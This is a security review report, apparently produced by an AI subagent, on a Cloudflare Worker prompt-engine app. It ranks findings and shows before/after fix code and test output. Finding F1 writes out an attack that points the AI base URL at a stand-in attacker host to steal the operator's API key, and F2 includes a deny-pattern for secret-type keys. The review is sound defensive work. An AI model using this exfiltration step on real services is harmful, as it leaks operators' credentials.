# Security Review — Prompt Engine (Cloudflare-native)

- **Date:** 2026-10-19
- **Reviewer:** Application Security Engineer (subagent)
- **Repository state:** `main` at `6be7591` (pre-review), fixes at `ea1a7e3`, evidence commit `1c6000f` (pushed)
- **Environment:** Node v24.21.0, npm 11.19.0
- **Scope:** dependency audit + manual review of worker routes/services/middleware/DB layer, client API layer, migrations, build output, and git hygiene. No fuzzing or network downloads used.
- **Method:** STRIDE-lite threat pass over trust boundaries (`browser → Worker → D1/KV`, `Worker → third-party AI/search providers`), data-flow review of user-controlled input to sinks (D1 SQL, `fetch`, response bodies), and supply-chain audit.

## 1. Scope / Commands Executed

```bash
npm audit --omit=dev --json     # production dependency audit
npm audit --json                # full dependency audit (includes dev deps)
npm run typecheck               # tsc -b
npm run lint                    # eslint .
npm run test:unit               # vitest unit suite
npm run test:integration        # vitest integration suite
npm run build                   # vite client build
git ls-files / git check-ignore # tracked-file + secret hygiene
# manual read of:
#   src/worker/{index.ts,env.ts,schemas.ts}
#   src/worker/routes/{ai,search,settings,prompts,skills,templates,evaluations,health}.ts
#   src/worker/middleware/{cors,rateLimit,security}.ts
#   src/worker/services/ai.ts
#   src/worker/db/{prompts,skills,templates,evaluations,settings,utils}.ts
#   src/client/lib/api.ts, src/client/**  (XSS/sink search)
#   migrations/0001_init.sql, wrangler.toml, .env.example, .gitignore
```

## 2. Findings

### 2.1 Positive findings (verified controls)

| # | Control | Evidence |
|---|---------|----------|
| P1 | **No known dependency vulnerabilities** | `npm audit --omit=dev` → `found 0 vulnerabilities` (8 prod deps); `npm audit` → `found 0 vulnerabilities` (517 total deps incl. dev). |
| P2 | **SQL injection:** all D1 statements parameterized | 16 `db.prepare(...)` sites, all values bound with `?1..?n` / `.bind(...)`. The only interpolation is `LIKE ?1` with `` `${search}%` `` passed as a **bound parameter**, not SQL syntax (`src/worker/db/{prompts,skills,templates}.ts`). |
| P3 | **Input validation:** zod schemas on every JSON body | `src/worker/routes/*.ts` use `Schema.safeParse`; validation failures return 400 with zod issue text (client-input feedback only). |
| P4 | **CORS:** no wildcard | `src/worker/middleware/cors.ts` allows only localhost dev origins and same-origin reflection; `origin` callback returns `null` otherwise. |
| P5 | **Security headers:** CSP and hardening present | `src/worker/middleware/security.ts` uses Hono `secureHeaders` with `default-src 'self'`, `script-src 'self'`, `object-src` etc. `style-src` permits `'unsafe-inline'` (Tailwind runtime requirement — low risk, no user CSS injection sink). |
| P6 | **XSS:** no unsafe DOM sinks | Repo-wide search for `dangerouslySetInnerHTML`, `innerHTML`, `eval(`, `new Function`, `document.write` → **no matches**. React escapes all rendered prompt/skill content. |
| P7 | **SSRF in search route:** fixed host, encoded query | `src/worker/routes/search.ts`: `https://api.duckduckgo.com/?q=${encodeURIComponent(q)}&format=json&no_redirect=1&no_html=1` — host is hard-coded, user input cannot alter scheme/host/path. |
| P8 | **Secret hygiene:** no secrets in repo, build, or git | `.env` absent; `.env.example` ships empty `OPENAI_API_KEY`; `.gitignore` covers `.env*` (except example), `dist/`, `.wrangler/`; `git check-ignore` confirms. Client bundle grep for API-key identifiers → no key material. `wrangler.toml [vars]` contains only `OPENAI_BASE_URL` and `OPENAI_MODEL`; key is env-only. |
| P9 | **IDs** generated with `crypto.randomUUID()` (non-enumerable) | `src/worker/db/utils.ts`. |
| P10 | **No worker-side logging of request bodies/secrets** | No `console.*` in `src/worker/` pre-review. |

### 2.2 Negative findings (ranked)

#### F1 — CRITICAL (fixed): unauthenticated settings → AI base-URL override → env API-key exfiltration (SSRF/credential leak)

- `PUT /api/settings/:key` had **no auth** and accepted **any key** with `value: z.unknown()`.
- `getAiConfig` (`src/worker/services/ai.ts`) resolved the base URL and API key from **D1 settings before env**:

```ts
// BEFORE (vulnerable)
const baseUrl = s.OPENAI_BASE_URL || s.openai_base_url || env.OPENAI_BASE_URL || "https://opencode.ai/zen/v1";
const apiKey  = s.OPENAI_API_KEY  || s.openai_api_key  || env.OPENAI_API_KEY;
```

- **Attack:** anonymous `PUT /api/settings/OPENAI_BASE_URL {"value":"https://attacker.example"}` → next `/api/ai/*` call fetches `https://attacker.example/chat/completions`; because no settings key was set, `cfg.apiKey` falls back to `env.OPENAI_API_KEY` and the worker sends `Authorization: Bearer <operator key>` to the attacker. Full request then follows. This is SSRF + secret exfiltration in one flow.
- Secondary: upstream response text was embedded in `Error` messages and reflected to the client by route catch blocks (`AI request failed: ${status} ${text}`).

**Fix applied (`ea1a7e3`):**
- `getAiConfig` sources `apiKey` **only from `env.OPENAI_API_KEY`**; settings may only override base URL/model (documented in code).
- New `isTrustedAiOrigin()` compares the resolved base URL origin against `env.OPENAI_BASE_URL` (or the built-in default); `Authorization` is attached **only** when trusted. A settings-overridden third-party host therefore receives no credentials.
- Upstream error detail truncated to 200 chars (defense in depth; route handlers no longer reflect it at all — see F4).

#### F2 — HIGH (fixed): unbounded settings key/value space

`PUT /api/settings/:key` accepted arbitrary key strings and arbitrarily large/structured JSON values into D1, with no auth. Impacts: persistent DB bloat, storage of secrets by third parties, key squatting.

**Fix applied (`ea1a7e3`)** in `src/worker/routes/settings.ts`:
- key must match `^[A-Za-z0-9._-]{1,64}$`;
- keys matching `/(api[_-]?key|secret|token|password|credential)/i` are rejected on **GET and PUT**;
- serialized value capped at 16 KiB (`MAX_VALUE_BYTES`), returns 400 `"Value too large"`.

Note: the AI settings no longer read secrets, so rejecting secret-shaped keys removes the remaining secret-storage path.

#### F3 — MEDIUM (fixed): rate limiting only covered `/api/ai/*`

`src/worker/middleware/rateLimit.ts` gated solely on `/api/ai/`, leaving all CRUD endpoints (`prompts`, `skills`, `templates`, `evaluations`, `settings`) open to unauthenticated write floods against D1.

**Fix applied (`ea1a7e3`):** limiter now applies to **all mutating `/api/*` methods** (`POST`, `PUT`, `PATCH`, `DELETE`), 60 req/min per IP, KV TTL 120s. GETs remain unlimited for read-only UI.

**Residual (accepted, documented):** the KV `get` → `put` counter is not atomic, so parallel requests can overshoot the limit; `cf-connecting-ip` is authoritative on Cloudflare, but the `x-forwarded-for` fallback is spoofable in local dev. Recommended future hardening: Cloudflare Rate Limiting rules or a Durable Object counter.

#### F4 — MEDIUM (fixed): internal error text reflected to clients

`app.onError` and 36 per-route `catch` blocks returned `err.message` with HTTP 500. This disclosed D1/provider errors, upstream URLs, and fetch failure details to anonymous clients.

**Fix applied (`ea1a7e3`):** all catch blocks and the global handler now `console.error` server-side and return `{ ok: false, error: "Internal server error" }`. Zod validation messages (400) are intentionally preserved — they describe client input, not internals.

#### F5 — LOW (not fixed, recommendations): input size ceilings and query bounds

- Zod schemas use `z.string().min(1)` with **no `max()`** on `title`, `content`, `goal`, `prompt`, `skill`, `query`, `messages[].content`; message array length unbounded.
- `listPrompts` / `listSkills` / `listTemplates` have **no `LIMIT`** (D1 caps results, but response size is user-triggerable).
- LIKE search passes user `%`/`_` unescaped (wildcard matching only; **not** injection).

**Recommendation:** add `max(20_000)`-style limits per field and `LIMIT 200` to list queries; escape `%`/`_` if literal matching matters.

#### F6 — LOW (documented, by design): no authentication

The API is fully unauthenticated (single-tenant tool). F1–F4 were materially worse because of this. If deployed on a public Worker route, put it behind **Cloudflare Access** (or add session auth) before storing shared data. Document the trust assumption in the README.

#### F7 — INFO: CORS dev origins allow-list

`localhost:5173/8787` are allowed everywhere, including production. Impact is minimal (they only work when the browser talks to those origins), but consider gating `DEV_ORIGINS` on `import.meta.env.DEV`/environment for production builds.

## 3. Risk Summary

| Severity | Count | Status |
|----------|-------|--------|
| Critical | 1 | **Fixed** — API-key exfiltration via settings base URL |
| High | 1 | **Fixed** — unbounded settings writes |
| Medium | 2 | **Fixed** — rate-limit scope, error reflection |
| Low | 3 | Open, documented (input bounds, auth posture, dev origins) |
| Dependencies | 0 | Clean (prod + dev) |

**Overall:** pre-fix posture **High risk** due to F1 (credential exfiltration by anonymous user). Post-fix: **Low/Moderate residual** — no server-side secret is reachable through user-writable state, mutation endpoints are rate-limited, and no injection/XSS/SSRF sink remains in reviewed code. Remaining risk is availability/abuse (no auth, unbounded values) and is documented for follow-up.

## 4. Remediation Summary

| Finding | Fix | File(s) |
|---------|-----|---------|
| F1 | API key env-only; credential attached only to trusted origin; upstream detail truncated | `src/worker/services/ai.ts` |
| F2 | Key allow-list + secret-key rejection + 16 KiB value cap (GET & PUT) | `src/worker/routes/settings.ts` |
| F3 | Rate limit all mutating `/api/*` requests | `src/worker/middleware/rateLimit.ts` |
| F4 | Stop reflecting `err.message`; log server-side, generic 500 | `src/worker/index.ts`, all `src/worker/routes/*.ts` |
| F5 | Follow-up: field `max()` limits, list `LIMIT`, LIKE escaping | `src/worker/schemas.ts`, `src/worker/db/*.ts` |
| F6 | Follow-up: Cloudflare Access or app auth; document trust model | deployment docs |
| F7 | Follow-up: environment-gate dev CORS origins | `src/worker/middleware/cors.ts` |

Regression coverage added in `tests/unit/ai.test.ts`: settings can never override the API key, and only the configured origin is trusted.

## 5. Raw Proof

### 5.1 Dependency audit

```text
$ npm audit --omit=dev --json
{
  "auditReportVersion": 2,
  "vulnerabilities": {},
  "metadata": {
    "vulnerabilities": { "info": 0, "low": 0, "moderate": 0, "high": 0, "critical": 0, "total": 0 },
    "dependencies": { "prod": 8, "dev": 510, "optional": 134, "peer": 0, "peerOptional": 0, "total": 517 }
  }
}

$ npm audit
found 0 vulnerabilities
```

### 5.2 Vulnerable pre-fix excerpt → post-fix excerpt

```ts
// BEFORE — src/worker/services/ai.ts
const baseUrl = s.OPENAI_BASE_URL || s.openai_base_url || env.OPENAI_BASE_URL || "https://opencode.ai/zen/v1";
const model   = s.OPENAI_MODEL    || s.openai_model    || env.OPENAI_MODEL    || "deepseek-v4-flash-free";
const apiKey  = s.OPENAI_API_KEY  || s.openai_api_key  || env.OPENAI_API_KEY;
...
if (cfg.apiKey) headers.Authorization = `Bearer ${cfg.apiKey}`;
```

```ts
// AFTER — settings may steer URL/model, never the secret
const apiKey = env.OPENAI_API_KEY;
...
export function isTrustedAiOrigin(baseUrl: string, env: Env): boolean {
  try {
    const url = new URL(baseUrl.replace(/\/+$/, ""));
    const trusted = new URL((env.OPENAI_BASE_URL || DEFAULT_BASE_URL).replace(/\/+$/, ""));
    return url.origin === trusted.origin;
  } catch {
    return false;
  }
}
...
if (cfg.apiKey && isTrustedAiOrigin(cfg.baseUrl, env)) {
  headers.Authorization = `Bearer ${cfg.apiKey}`;
}
```

```ts
// AFTER — src/worker/routes/settings.ts
const ALLOWED_KEY_RE = /^[A-Za-z0-9._-]{1,64}$/;
const FORBIDDEN_KEY_RE = /(api[_-]?key|secret|token|password|credential)/i;
const MAX_VALUE_BYTES = 16384;
function isRejectedKey(key: string): boolean {
  return !ALLOWED_KEY_RE.test(key) || FORBIDDEN_KEY_RE.test(key);
}
```

```ts
// AFTER — src/worker/index.ts
app.onError((err, c) => {
  console.error("Unhandled worker error:", err);
  return c.json({ ok: false, error: "Internal server error" }, 500);
});
```

### 5.3 Quality gates (post-fix)

```text
$ npm run typecheck
> tsc -b
(no output — success)

$ npm run lint
> eslint .
(no output — success)

$ npm run test:unit
Test Files  3 passed (3)
     Tests  10 passed (10)

$ npm run test:integration
Test Files  1 passed (1)
     Tests  2 passed (2)

$ npm run build
dist/client/assets/index-Dh4yCY_e.js   174.76 kB │ gzip: 52.71 kB
✓ built in 11.63s
```

### 5.4 Patch scope / commits

```text
ea1a7e3 fix(security): close SSRF/secret-exfiltration path in AI settings and harden routes
1c6000f chore: update task tracking

 src/worker/index.ts                |  6 ++++--
 src/worker/middleware/rateLimit.ts |  6 +++++-
 src/worker/routes/ai.ts            | 44 +++++++++++++-----------
 src/worker/routes/evaluations.ts   | 12 +++---
 src/worker/routes/health.ts        |  4 +--
 src/worker/routes/prompts.ts       | 20 +++++-----
 src/worker/routes/search.ts        |  4 +--
 src/worker/routes/settings.ts      | 32 +++++++++++++++---
 src/worker/routes/skills.ts        | 20 +++++-----
 src/worker/routes/templates.ts     | 28 +++++++------
 src/worker/services/ai.ts          | 44 +++++++++++++-----------
 tests/unit/ai.test.ts              | 22 +++++++++++-
```
